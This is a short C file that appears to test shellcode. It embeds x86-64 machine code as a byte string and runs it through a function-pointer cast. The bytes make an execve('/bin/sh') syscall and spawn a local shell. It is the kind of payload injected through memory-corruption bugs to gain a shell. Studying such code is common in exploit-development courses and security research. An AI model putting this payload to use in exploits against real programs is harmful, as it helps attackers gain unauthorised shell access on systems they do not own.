#include <stdlib.h>

const char shellcode[] = "\xeb\x13\x48\x31\xff\x5f\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x48\x83\xc0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

int main()
{
    (*(void(*)())shellcode)();
    // exit(0);
}